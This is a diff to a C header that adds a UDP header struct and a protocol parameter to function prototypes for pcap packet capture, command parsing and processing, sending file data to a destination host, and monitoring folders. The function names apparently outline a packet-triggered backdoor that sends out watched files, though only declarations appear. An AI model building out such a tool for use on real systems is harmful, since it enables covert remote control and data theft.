@@ -84,6 +84,13 @@ struct tcp_struct {
         u_short th_sum;                 /* checksum */
         u_short th_urp;                 /* urgent pointer */
 };
+/* UDP header */
+struct udp_struct {
+	u_short	uh_sport;		/* source port */
+	u_short	uh_dport;		/* destination port */
+	u_short	uh_ulen;		/* datagram length */
+	u_short	uh_sum;			/* datagram checksum */
+};
 
 struct filelist {
 	const char* path;
@@ -91,12 +98,12 @@ struct filelist {
 	struct filelist * next;
 };
 
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port);
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol);
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
 int parse_cmd(char * command, char * data);
-int process_command(char * command, const struct ip_struct * ip, const int dest_port);
-int send_file_data(const char* folder, const char * fileName, const char* src_ip, const char* dest_ip, const int dest_port);
-int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port);
+int process_command(char * command, const struct ip_struct * ip, const int dest_port, int protocol);
+int send_file_data(const char* folder, const char * fileName, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
+int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
 
 #endif
